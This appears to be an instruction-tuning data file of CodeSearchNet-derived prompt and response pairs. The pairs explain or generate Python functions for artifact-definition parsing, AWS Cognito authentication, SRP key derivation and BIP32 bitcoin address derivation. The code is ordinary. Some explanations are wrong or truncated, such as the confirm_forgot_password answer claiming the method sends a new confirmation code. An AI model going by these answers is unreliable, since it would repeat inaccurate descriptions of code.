{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _CheckSQLite3(self):\n    # On Windows sqlite3 can be provided by both pysqlite2.dbapi2 and\n    # sqlite3. sqlite3 is provided with the Python installation and\n    # pysqlite2.dbapi2 by the pysqlite2 Python module. Typically\n    # pysqlite2.dbapi2 would contain a newer version of sqlite3, hence\n    # we check for its presence first.\n    module_name = 'pysqlite2.dbapi2'\n    minimum_version = '3.7.8'\n\n    module_object = self._ImportPythonModule(module_name)\n    if not module_object:\n      module_name = 'sqlite3'\n\n    module_object = self._ImportPythonModule(module_name)\n    if not module_object:\n      status_message = 'missing: {0:s}.'.format(module_name)\n      return False, status_message\n\n    return self._CheckPythonModuleVersion(\n        module_name, module_object, 'sqlite_version', minimum_version, None)", "response": "Checks the availability of sqlite3."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _PrintCheckDependencyStatus(\n      self, dependency, result, status_message, verbose_output=True):\n    \"\"\"Prints the check dependency status.\n\n    Args:\n      dependency (DependencyDefinition): dependency definition.\n      result (bool): True if the Python module is available and conforms to\n            the minimum required version, False otherwise.\n      status_message (str): status message.\n      verbose_output (Optional[bool]): True if output should be verbose.\n    \"\"\"\n    if not result or dependency.is_optional:\n      if dependency.is_optional:\n        status_indicator = '[OPTIONAL]'\n      else:\n        status_indicator = '[FAILURE]'\n\n      print('{0:s}\\t{1:s}'.format(status_indicator, status_message))\n\n    elif verbose_output:\n      print('[OK]\\t\\t{0:s}'.format(status_message))", "response": "Prints the check dependency status."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef CheckDependencies(self, verbose_output=True):\n    print('Checking availability and versions of dependencies.')\n    check_result = True\n\n    for module_name, dependency in sorted(self.dependencies.items()):\n      if module_name == 'sqlite3':\n        result, status_message = self._CheckSQLite3()\n      else:\n        result, status_message = self._CheckPythonModule(dependency)\n\n      if not result and module_name == 'lzma':\n        dependency.name = 'backports.lzma'\n        result, status_message = self._CheckPythonModule(dependency)\n\n      if not result and not dependency.is_optional:\n        check_result = False\n\n      self._PrintCheckDependencyStatus(\n          dependency, result, status_message, verbose_output=verbose_output)\n\n    if check_result and not verbose_output:\n      print('[OK]')\n\n    print('')\n    return check_result", "response": "Checks availability of the dependencies."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _ReadLabels(self, artifact_definition_values, artifact_definition, name):\n    labels = artifact_definition_values.get('labels', [])\n\n    undefined_labels = set(labels).difference(self.labels)\n    if undefined_labels:\n      raise errors.FormatError(\n          'Artifact definition: {0:s} found undefined labels: {1:s}.'.format(\n              name, ', '.join(undefined_labels)))\n\n    artifact_definition.labels = labels", "response": "Reads the optional artifact definition labels."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nread the optional artifact or source type supported OS.", "response": "def _ReadSupportedOS(self, definition_values, definition_object, name):\n    \"\"\"Reads the optional artifact or source type supported OS.\n\n    Args:\n      definition_values (dict[str, object]): artifact definition values.\n      definition_object (ArtifactDefinition|SourceType): the definition object.\n      name (str): name of the artifact definition.\n\n    Raises:\n      FormatError: if there are undefined supported operating systems.\n    \"\"\"\n    supported_os = definition_values.get('supported_os', [])\n    if not isinstance(supported_os, list):\n      raise errors.FormatError(\n          'Invalid supported_os type: {0!s}'.format(type(supported_os)))\n\n    undefined_supported_os = set(supported_os).difference(self.supported_os)\n    if undefined_supported_os:\n      error_string = (\n          'Artifact definition: {0:s} undefined supported operating system: '\n          '{1:s}.').format(name, ', '.join(undefined_supported_os))\n      raise errors.FormatError(error_string)\n\n    definition_object.supported_os = supported_os"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreading the artifact definition sources.", "response": "def _ReadSources(self, artifact_definition_values, artifact_definition, name):\n    \"\"\"Reads the artifact definition sources.\n\n    Args:\n      artifact_definition_values (dict[str, object]): artifact definition\n          values.\n      artifact_definition (ArtifactDefinition): an artifact definition.\n      name (str): name of the artifact definition.\n\n    Raises:\n      FormatError: if the type indicator is not set or unsupported,\n          or if required attributes are missing.\n    \"\"\"\n    sources = artifact_definition_values.get('sources')\n    if not sources:\n      raise errors.FormatError(\n          'Invalid artifact definition: {0:s} missing sources.'.format(name))\n\n    for source in sources:\n      type_indicator = source.get('type', None)\n      if not type_indicator:\n        raise errors.FormatError(\n            'Invalid artifact definition: {0:s} source type.'.format(name))\n\n      attributes = source.get('attributes', None)\n\n      try:\n        source_type = artifact_definition.AppendSource(\n            type_indicator, attributes)\n      except errors.FormatError as exception:\n        raise errors.FormatError(\n            'Invalid artifact definition: {0:s}, with error: {1!s}'.format(\n                name, exception))\n\n      # TODO: deprecate these left overs from the collector definition.\n      if source_type:\n        if source.get('returned_types', None):\n          raise errors.FormatError((\n              'Invalid artifact definition: {0:s} returned_types no longer '\n              'supported.').format(name))\n\n        source_type.conditions = source.get('conditions', [])\n        self._ReadSupportedOS(source, source_type, name)\n        if set(source_type.supported_os) - set(\n            artifact_definition.supported_os):\n          raise errors.FormatError((\n              'Invalid artifact definition: {0:s} missing '\n              'supported_os.').format(name))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nread an artifact definition from a dictionary.", "response": "def ReadArtifactDefinitionValues(self, artifact_definition_values):\n    \"\"\"Reads an artifact definition from a dictionary.\n\n    Args:\n      artifact_definition_values (dict[str, object]): artifact definition\n          values.\n\n    Returns:\n      ArtifactDefinition: an artifact definition.\n\n    Raises:\n      FormatError: if the format of the artifact definition is not set\n          or incorrect.\n    \"\"\"\n    if not artifact_definition_values:\n      raise errors.FormatError('Missing artifact definition values.')\n\n    different_keys = (\n        set(artifact_definition_values) - definitions.TOP_LEVEL_KEYS)\n    if different_keys:\n      different_keys = ', '.join(different_keys)\n      raise errors.FormatError('Undefined keys: {0:s}'.format(different_keys))\n\n    name = artifact_definition_values.get('name', None)\n    if not name:\n      raise errors.FormatError('Invalid artifact definition missing name.')\n\n    # The description is assumed to be mandatory.\n    description = artifact_definition_values.get('doc', None)\n    if not description:\n      raise errors.FormatError(\n          'Invalid artifact definition: {0:s} missing description.'.format(\n              name))\n\n    artifact_definition = artifact.ArtifactDefinition(\n        name, description=description)\n\n    if artifact_definition_values.get('collectors', []):\n      raise errors.FormatError(\n          'Invalid artifact definition: {0:s} still uses collectors.'.format(\n              name))\n\n    urls = artifact_definition_values.get('urls', [])\n    if not isinstance(urls, list):\n      raise errors.FormatError(\n          'Invalid artifact definition: {0:s} urls is not a list.'.format(\n              name))\n\n    # TODO: check conditions.\n    artifact_definition.conditions = artifact_definition_values.get(\n        'conditions', [])\n    artifact_definition.provides = artifact_definition_values.get(\n        'provides', [])\n    self._ReadLabels(artifact_definition_values, artifact_definition, name)\n    self._ReadSupportedOS(artifact_definition_values, artifact_definition, name)\n    artifact_definition.urls = urls\n    self._ReadSources(artifact_definition_values, artifact_definition, name)\n\n    return artifact_definition"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nread artifact definitions from a directory.", "response": "def ReadDirectory(self, path, extension='yaml'):\n    \"\"\"Reads artifact definitions from a directory.\n\n    This function does not recurse sub directories.\n\n    Args:\n      path (str): path of the directory to read from.\n      extension (Optional[str]): extension of the filenames to read.\n\n    Yields:\n      ArtifactDefinition: an artifact definition.\n    \"\"\"\n    if extension:\n      glob_spec = os.path.join(path, '*.{0:s}'.format(extension))\n    else:\n      glob_spec = os.path.join(path, '*')\n\n    for artifact_file in glob.glob(glob_spec):\n      for artifact_definition in self.ReadFile(artifact_file):\n        yield artifact_definition"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef ReadFile(self, filename):\n    with io.open(filename, 'r', encoding='utf-8') as file_object:\n      for artifact_definition in self.ReadFileObject(file_object):\n        yield artifact_definition", "response": "Reads artifact definitions from a file."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef ReadFileObject(self, file_object):\n    # TODO: add try, except?\n    json_definitions = json.loads(file_object.read())\n\n    last_artifact_definition = None\n    for json_definition in json_definitions:\n      try:\n        artifact_definition = self.ReadArtifactDefinitionValues(json_definition)\n      except errors.FormatError as exception:\n        error_location = 'At start'\n        if last_artifact_definition:\n          error_location = 'After: {0:s}'.format(last_artifact_definition.name)\n\n        raise errors.FormatError(\n            '{0:s} {1!s}'.format(error_location, exception))\n\n      yield artifact_definition\n      last_artifact_definition = artifact_definition", "response": "Reads artifact definitions from a file - like object."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef ReadFileObject(self, file_object):\n    # TODO: add try, except?\n    yaml_generator = yaml.safe_load_all(file_object)\n\n    last_artifact_definition = None\n    for yaml_definition in yaml_generator:\n      try:\n        artifact_definition = self.ReadArtifactDefinitionValues(yaml_definition)\n      except errors.FormatError as exception:\n        error_location = 'At start'\n        if last_artifact_definition:\n          error_location = 'After: {0:s}'.format(last_artifact_definition.name)\n\n        raise errors.FormatError(\n            '{0:s} {1!s}'.format(error_location, exception))\n\n      yield artifact_definition\n      last_artifact_definition = artifact_definition", "response": "Reads artifact definitions from a file - like object."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nwrites the artifact definitions to a file.", "response": "def WriteArtifactsFile(self, artifacts, filename):\n    \"\"\"Writes artifact definitions to a file.\n\n    Args:\n      artifacts (list[ArtifactDefinition]): artifact definitions to be written.\n      filename (str): name of the file to write artifacts to.\n    \"\"\"\n    with open(filename, 'w') as file_object:\n      file_object.write(self.FormatArtifacts(artifacts))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nformat the artifacts to the desired output format.", "response": "def FormatArtifacts(self, artifacts):\n    \"\"\"Formats artifacts to desired output format.\n\n    Args:\n      artifacts (list[ArtifactDefinition]): artifact definitions.\n\n    Returns:\n      str: formatted string of artifact definition.\n    \"\"\"\n    artifact_definitions = [artifact.AsDict() for artifact in artifacts]\n    json_data = json.dumps(artifact_definitions)\n    return json_data"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef FormatArtifacts(self, artifacts):\n    # TODO: improve output formatting of yaml\n    artifact_definitions = [artifact.AsDict() for artifact in artifacts]\n    yaml_data = yaml.safe_dump_all(artifact_definitions)\n    return yaml_data", "response": "Formats artifacts to desired output format."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nappend a source to the internal list of sources.", "response": "def AppendSource(self, type_indicator, attributes):\n    \"\"\"Appends a source.\n\n    If you want to implement your own source type you should create a subclass\n    in source_type.py and change the AppendSource method to handle the new\n    subclass. This function raises FormatError if an unsupported source type\n    indicator is encountered.\n\n    Args:\n      type_indicator (str): source type indicator.\n      attributes (dict[str, object]): source attributes.\n\n    Returns:\n      SourceType: a source type.\n\n    Raises:\n      FormatError: if the type indicator is not set or unsupported,\n          or if required attributes are missing.\n    \"\"\"\n    if not type_indicator:\n      raise errors.FormatError('Missing type indicator.')\n\n    try:\n      source_object = registry.ArtifactDefinitionsRegistry.CreateSourceType(\n          type_indicator, attributes)\n    except (AttributeError, TypeError) as exception:\n      raise errors.FormatError((\n          'Unable to create source type: {0:s} for artifact definition: {1:s} '\n          'with error: {2!s}').format(type_indicator, self.name, exception))\n\n    self.sources.append(source_object)\n    return source_object"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nrepresenting an artifact as a dictionary.", "response": "def AsDict(self):\n    \"\"\"Represents an artifact as a dictionary.\n\n    Returns:\n      dict[str, object]: artifact attributes.\n    \"\"\"\n    sources = []\n    for source in self.sources:\n      source_definition = {\n          'type': source.type_indicator,\n          'attributes': source.AsDict()\n      }\n      if source.supported_os:\n        source_definition['supported_os'] = source.supported_os\n      if source.conditions:\n        source_definition['conditions'] = source.conditions\n      sources.append(source_definition)\n\n    artifact_definition = {\n        'name': self.name,\n        'doc': self.description,\n        'sources': sources,\n    }\n    if self.labels:\n      artifact_definition['labels'] = self.labels\n    if self.supported_os:\n      artifact_definition['supported_os'] = self.supported_os\n    if self.provides:\n      artifact_definition['provides'] = self.provides\n    if self.conditions:\n      artifact_definition['conditions'] = self.conditions\n    if self.urls:\n      artifact_definition['urls'] = self.urls\n    return artifact_definition"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef dict_to_cognito(attributes, attr_map=None):\n    if attr_map is None:\n        attr_map = {}\n    for k,v in attr_map.items():\n        if v in attributes.keys():\n            attributes[k] = attributes.pop(v)\n\n    return [{'Name': key, 'Value': value} for key, value in attributes.items()]", "response": "Convert a dictionary of User Pool attribute names and values to a list of User Pool attribute formatted dicts."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nconverting a snake_case string to a CamelCase string", "response": "def snake_to_camel(snake_str):\n    \"\"\"\n    :param snake_str: string\n    :return: string converted from a snake_case to a CamelCase\n    \"\"\"\n    components = snake_str.split('_')\n    return ''.join(x.title() for x in components)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the specified user object", "response": "def get_user_obj(self, username=None, attribute_list=None, metadata=None,\n                     attr_map=None):\n        \"\"\"\n        Returns the specified\n        :param username: Username of the user\n        :param attribute_list: List of tuples that represent the user's\n            attributes as returned by the admin_get_user or get_user boto3 methods\n        :param metadata: Metadata about the user\n        :param attr_map: Dictionary that maps the Cognito attribute names to\n        what we'd like to display to the users\n        :return:\n        \"\"\"\n        return self.user_class(username=username,attribute_list=attribute_list,\n                               cognito_obj=self,\n                               metadata=metadata,attr_map=attr_map)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncheck the exp attribute of the access_token and returns True if it has expired False otherwise", "response": "def check_token(self, renew=True):\n        \"\"\"\n        Checks the exp attribute of the access_token and either refreshes\n        the tokens by calling the renew_access_tokens method or does nothing\n        :param renew: bool indicating whether to refresh on expiration\n        :return: bool indicating whether access_token has expired\n        \"\"\"\n        if not self.access_token:\n            raise AttributeError('Access Token Required to Check Token')\n        now = datetime.datetime.now()\n        dec_access_token = jwt.get_unverified_claims(self.access_token)\n\n        if now > datetime.datetime.fromtimestamp(dec_access_token['exp']):\n            expired = True\n            if renew:\n                self.renew_access_token()\n        else:\n            expired = False\n        return expired"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef register(self, username, password, attr_map=None):\n        attributes = self.base_attributes.copy()\n        if self.custom_attributes:\n            attributes.update(self.custom_attributes)\n        cognito_attributes = dict_to_cognito(attributes, attr_map)\n        params = {\n            'ClientId': self.client_id,\n            'Username': username,\n            'Password': password,\n            'UserAttributes': cognito_attributes\n        }\n        self._add_secret_hash(params, 'SecretHash')\n        response = self.client.sign_up(**params)\n\n        attributes.update(username=username, password=password)\n        self._set_attributes(response, attributes)\n\n        response.pop('ResponseMetadata')\n        return response", "response": "Register a user with the Cognito client."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef admin_confirm_sign_up(self, username=None):\n        if not username:\n            username = self.username\n        self.client.admin_confirm_sign_up(\n            UserPoolId=self.user_pool_id,\n            Username=username,\n        )", "response": "Confirm a user registration as an admin without using a confirmation\n        code. Works on any user."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef confirm_sign_up(self,confirmation_code,username=None):\n        if not username:\n            username = self.username\n        params = {'ClientId': self.client_id,\n                  'Username': username,\n                  'ConfirmationCode': confirmation_code}\n        self._add_secret_hash(params, 'SecretHash')\n        self.client.confirm_sign_up(**params)", "response": "Confirm a signup request."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef admin_authenticate(self, password):\n        auth_params = {\n                'USERNAME': self.username,\n                'PASSWORD': password\n            }\n        self._add_secret_hash(auth_params, 'SECRET_HASH')\n        tokens = self.client.admin_initiate_auth(\n            UserPoolId=self.user_pool_id,\n            ClientId=self.client_id,\n            # AuthFlow='USER_SRP_AUTH'|'REFRESH_TOKEN_AUTH'|'REFRESH_TOKEN'|'CUSTOM_AUTH'|'ADMIN_NO_SRP_AUTH',\n            AuthFlow='ADMIN_NO_SRP_AUTH',\n            AuthParameters=auth_params,\n        )\n\n        self.verify_token(tokens['AuthenticationResult']['IdToken'], 'id_token','id')\n        self.refresh_token = tokens['AuthenticationResult']['RefreshToken']\n        self.verify_token(tokens['AuthenticationResult']['AccessToken'], 'access_token','access')\n        self.token_type = tokens['AuthenticationResult']['TokenType']", "response": "Authenticate the user using admin super privileges\n       "}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef authenticate(self, password):\n        aws = AWSSRP(username=self.username, password=password, pool_id=self.user_pool_id,\n                     client_id=self.client_id, client=self.client,\n                     client_secret=self.client_secret)\n        tokens = aws.authenticate_user()\n        self.verify_token(tokens['AuthenticationResult']['IdToken'],'id_token','id')\n        self.refresh_token = tokens['AuthenticationResult']['RefreshToken']\n        self.verify_token(tokens['AuthenticationResult']['AccessToken'], 'access_token','access')\n        self.token_type = tokens['AuthenticationResult']['TokenType']", "response": "Authenticate the user using the SRP protocol"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nresponding to the new password challenge using the SRP protocol", "response": "def new_password_challenge(self, password, new_password):\n        \"\"\"\n        Respond to the new password challenge using the SRP protocol\n        :param password: The user's current passsword\n        :param password: The user's new passsword\n        \"\"\"\n        aws = AWSSRP(username=self.username, password=password, pool_id=self.user_pool_id,\n                     client_id=self.client_id, client=self.client,\n                     client_secret=self.client_secret)\n        tokens = aws.set_new_password_challenge(new_password)\n        self.id_token = tokens['AuthenticationResult']['IdToken']\n        self.refresh_token = tokens['AuthenticationResult']['RefreshToken']\n        self.access_token = tokens['AuthenticationResult']['AccessToken']\n        self.token_type = tokens['AuthenticationResult']['TokenType']"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nlogging the user out of all clients and removes the expires_in refresh_token access_token and token_type attributes.", "response": "def logout(self):\n        \"\"\"\n        Logs the user out of all clients and removes the expires_in,\n        expires_datetime, id_token, refresh_token, access_token, and token_type\n        attributes\n        :return:\n        \"\"\"\n        self.client.global_sign_out(\n            AccessToken=self.access_token\n        )\n\n        self.id_token = None\n        self.refresh_token = None\n        self.access_token = None\n        self.token_type = None"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nupdates the user attributes of the current user with the given attrs.", "response": "def update_profile(self, attrs, attr_map=None):\n        \"\"\"\n        Updates User attributes\n        :param attrs: Dictionary of attribute name, values\n        :param attr_map: Dictionary map from Cognito attributes to attribute\n        names we would like to show to our users\n        \"\"\"\n        user_attrs = dict_to_cognito(attrs,attr_map)\n        self.client.update_user_attributes(\n            UserAttributes=user_attrs,\n            AccessToken=self.access_token\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_user(self, attr_map=None):\n        user = self.client.get_user(\n                AccessToken=self.access_token\n            )\n\n        user_metadata = {\n            'username': user.get('Username'),\n            'id_token': self.id_token,\n            'access_token': self.access_token,\n            'refresh_token': self.refresh_token,\n        }\n        return self.get_user_obj(username=self.username,\n                                 attribute_list=user.get('UserAttributes'),\n                                 metadata=user_metadata,attr_map=attr_map)", "response": "Returns a UserObj object by using the Cognito user s access token."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_users(self, attr_map=None):\n        kwargs = {\"UserPoolId\":self.user_pool_id}\n\n        response = self.client.list_users(**kwargs)\n        return [self.get_user_obj(user.get('Username'),\n                                  attribute_list=user.get('Attributes'),\n                                  metadata={'username':user.get('Username')},\n                                  attr_map=attr_map)\n                for user in response.get('Users')]", "response": "Returns all users for a user pool."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting the user details using admin super privileges.", "response": "def admin_get_user(self, attr_map=None):\n        \"\"\"\n        Get the user's details using admin super privileges.\n        :param attr_map: Dictionary map from Cognito attributes to attribute\n        names we would like to show to our users\n        :return: UserObj object\n        \"\"\"\n        user = self.client.admin_get_user(\n                           UserPoolId=self.user_pool_id,\n                           Username=self.username)\n        user_metadata = {\n            'enabled': user.get('Enabled'),\n            'user_status':user.get('UserStatus'),\n            'username':user.get('Username'),\n            'id_token': self.id_token,\n            'access_token': self.access_token,\n            'refresh_token': self.refresh_token\n        }\n        return self.get_user_obj(username=self.username,\n                                 attribute_list=user.get('UserAttributes'),\n                                 metadata=user_metadata,attr_map=attr_map)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncreate a user using admin super privileges.", "response": "def admin_create_user(self, username, temporary_password='', attr_map=None, **kwargs):\n        \"\"\"\n        Create a user using admin super privileges.\n        :param username: User Pool username\n        :param temporary_password: The temporary password to give the user.\n        Leave blank to make Cognito generate a temporary password for the user.\n        :param attr_map: Attribute map to Cognito's attributes\n        :param kwargs: Additional User Pool attributes\n        :return response: Response from Cognito\n        \"\"\"\n        response = self.client.admin_create_user(\n            UserPoolId=self.user_pool_id,\n            Username=username,\n            UserAttributes=dict_to_cognito(kwargs, attr_map),\n            TemporaryPassword=temporary_password,\n        )\n        kwargs.update(username=username)\n        self._set_attributes(response, kwargs)\n\n        response.pop('ResponseMetadata')\n        return response"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nsends the user an attribute verification code for the specified attribute name.", "response": "def send_verification(self, attribute='email'):\n        \"\"\"\n        Sends the user an attribute verification code for the specified attribute name.\n        :param attribute: Attribute to confirm\n        \"\"\"\n        self.check_token()\n        self.client.get_user_attribute_verification_code(\n            AccessToken=self.access_token,\n            AttributeName=attribute\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nverify the specified user attributes in the user pool.", "response": "def validate_verification(self, confirmation_code, attribute='email'):\n        \"\"\"\n        Verifies the specified user attributes in the user pool.\n        :param confirmation_code: Code sent to user upon intiating verification\n        :param attribute: Attribute to confirm\n        \"\"\"\n        self.check_token()\n        return self.client.verify_user_attribute(\n            AccessToken=self.access_token,\n            AttributeName=attribute,\n            Code=confirmation_code\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nrenewing the access token on the User using the refresh token.", "response": "def renew_access_token(self):\n        \"\"\"\n        Sets a new access token on the User using the refresh token.\n        \"\"\"\n        auth_params = {'REFRESH_TOKEN': self.refresh_token}\n        self._add_secret_hash(auth_params, 'SECRET_HASH')\n        refresh_response = self.client.initiate_auth(\n            ClientId=self.client_id,\n            AuthFlow='REFRESH_TOKEN',\n            AuthParameters=auth_params,\n        )\n\n        self._set_attributes(\n            refresh_response,\n            {\n                'access_token': refresh_response['AuthenticationResult']['AccessToken'],\n                'id_token': refresh_response['AuthenticationResult']['IdToken'],\n                'token_type': refresh_response['AuthenticationResult']['TokenType']\n            }\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef initiate_forgot_password(self):\n        params = {\n            'ClientId': self.client_id,\n            'Username': self.username\n        }\n        self._add_secret_hash(params, 'SecretHash')\n        self.client.forgot_password(**params)", "response": "Initiate a password reset for the user."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef confirm_forgot_password(self, confirmation_code, password):\n        params = {'ClientId': self.client_id,\n                  'Username': self.username,\n                  'ConfirmationCode': confirmation_code,\n                  'Password': password\n                  }\n        self._add_secret_hash(params, 'SecretHash')\n        response = self.client.confirm_forgot_password(**params)\n        self._set_attributes(response, {'password': password})", "response": "Allows a user to enter a code provided when they reset their password. This method is used to send a new confirmation code to the user s account."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef change_password(self, previous_password, proposed_password):\n        self.check_token()\n        response = self.client.change_password(\n            PreviousPassword=previous_password,\n            ProposedPassword=proposed_password,\n            AccessToken=self.access_token\n        )\n        self._set_attributes(response, {'password': proposed_password})", "response": "Change the password of the user."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nsets attributes based on response code and dictionary of attributes.", "response": "def _set_attributes(self, response, attribute_dict):\n        \"\"\"\n        Set user attributes based on response code\n        :param response: HTTP response from Cognito\n        :attribute dict: Dictionary of attribute name and values\n        \"\"\"\n        status_code = response.get(\n            'HTTPStatusCode',\n            response['ResponseMetadata']['HTTPStatusCode']\n        )\n        if status_code == 200:\n            for k, v in attribute_dict.items():\n                setattr(self, k, v)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngets a group by a name", "response": "def get_group(self, group_name):\n        \"\"\"\n        Get a group by a name\n        :param group_name: name of a group\n        :return: instance of the self.group_class\n        \"\"\"\n        response = self.client.get_group(GroupName=group_name,\n                                         UserPoolId=self.user_pool_id)\n        return self.get_group_obj(response.get('Group'))"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns all groups for a user pool. Returns instances of the class.", "response": "def get_groups(self):\n        \"\"\"\n        Returns all groups for a user pool. Returns instances of the\n        self.group_class.\n        :return: list of instances\n        \"\"\"\n        response = self.client.list_groups(UserPoolId=self.user_pool_id)\n        return [self.get_group_obj(group_data)\n                for group_data in response.get('Groups')]"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef hash_sha256(buf):\n    a = hashlib.sha256(buf).hexdigest()\n    return (64 - len(a)) * '0' + a", "response": "Hash a buffer with SHA256."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef pad_hex(long_int):\n    if not isinstance(long_int, six.string_types):\n        hash_str = long_to_hex(long_int)\n    else:\n        hash_str = long_int\n    if len(hash_str) % 2 == 1:\n        hash_str = '0%s' % hash_str\n    elif hash_str[0] in '89ABCDEFabcdef':\n        hash_str = '00%s' % hash_str\n    return hash_str", "response": "Converts a Long integer or hex string to hex format padded with zeroes for hashing\n   "}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncompute the HKDF of the input key material.", "response": "def compute_hkdf(ikm, salt):\n    \"\"\"\n    Standard hkdf algorithm\n    :param {Buffer} ikm Input key material.\n    :param {Buffer} salt Salt value.\n    :return {Buffer} Strong key material.\n    @private\n    \"\"\"\n    prk = hmac.new(salt, ikm, hashlib.sha256).digest()\n    info_bits_update = info_bits + bytearray(chr(1), 'utf-8')\n    hmac_hash = hmac.new(prk, info_bits_update, hashlib.sha256).digest()\n    return hmac_hash[:16]"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncalculate the client s value U which is the hash of A and B.", "response": "def calculate_u(big_a, big_b):\n    \"\"\"\n    Calculate the client's value U which is the hash of A and B\n    :param {Long integer} big_a Large A value.\n    :param {Long integer} big_b Server B value.\n    :return {Long integer} Computed U value.\n    \"\"\"\n    u_hex_hash = hex_hash(pad_hex(big_a) + pad_hex(big_b))\n    return hex_to_long(u_hex_hash)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncalculating the client s public value A with the generated random number a", "response": "def calculate_a(self):\n        \"\"\"\n        Calculate the client's public value A = g^a%N\n        with the generated random number a\n        :param {Long integer} a Randomly generated small A.\n        :return {Long integer} Computed large A.\n        \"\"\"\n        big_a = pow(self.g, self.small_a_value, self.big_n)\n        # safety check\n        if (big_a % self.big_n) == 0:\n            raise ValueError('Safety check for A failed')\n        return big_a"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_password_authentication_key(self, username, password, server_b_value, salt):\n        u_value = calculate_u(self.large_a_value, server_b_value)\n        if u_value == 0:\n            raise ValueError('U cannot be zero.')\n        username_password = '%s%s:%s' % (self.pool_id.split('_')[1], username, password)\n        username_password_hash = hash_sha256(username_password.encode('utf-8'))\n\n        x_value = hex_to_long(hex_hash(pad_hex(salt) + username_password_hash))\n        g_mod_pow_xn = pow(self.g, x_value, self.big_n)\n        int_value2 = server_b_value - self.k * g_mod_pow_xn\n        s_value = pow(int_value2, self.small_a_value + u_value * x_value, self.big_n)\n        hkdf = compute_hkdf(bytearray.fromhex(pad_hex(s_value)),\n                            bytearray.fromhex(pad_hex(long_to_hex(u_value))))\n        return hkdf", "response": "Calculates the final HKDF value based on computed S value and computed U value and the key\n       "}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncreate a new bitcoin address to accept payments for a user.", "response": "def create_new_address_for_user(self, user_id):\n        \"\"\"Create a new bitcoin address to accept payments for a User.\n\n        This is a convenience wrapper around `get_child` that helps you do\n        the right thing. This method always creates a public, non-prime\n        address that can be generated from a BIP32 public key on an\n        insecure server.\"\"\"\n        max_id = 0x80000000\n        if user_id < 0 or user_id > max_id:\n            raise ValueError(\n                \"Invalid UserID. Must be between 0 and %s\" % max_id)\n        return self.get_child(user_id, is_prime=False, as_private=False)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_child_for_path(self, path):\n        path = ensure_str(path)\n\n        if not path:\n            raise InvalidPathError(\"%s is not a valid path\" % path)\n\n        # Figure out public/private derivation\n        as_private = True\n        if path.startswith(\"M\"):\n            as_private = False\n        if path.endswith(\".pub\"):\n            as_private = False\n            path = path[:-4]\n\n        parts = path.split(\"/\")\n        if len(parts) == 0:\n            raise InvalidPathError()\n\n        child = self\n        for part in parts:\n            if part.lower() == \"m\":\n                continue\n            is_prime = None  # Let primeness be figured out by the child number\n            if part[-1] in \"'p\":\n                is_prime = True\n                part = part.replace(\"'\", \"\").replace(\"p\", \"\")\n            try:\n                child_number = long_or_int(part)\n            except ValueError:\n                raise InvalidPathError(\"%s is not a valid path\" % path)\n            child = child.get_child(child_number, is_prime)\n        if not as_private:\n            return child.public_copy()\n        return child", "response": "Get a child for a given path."}
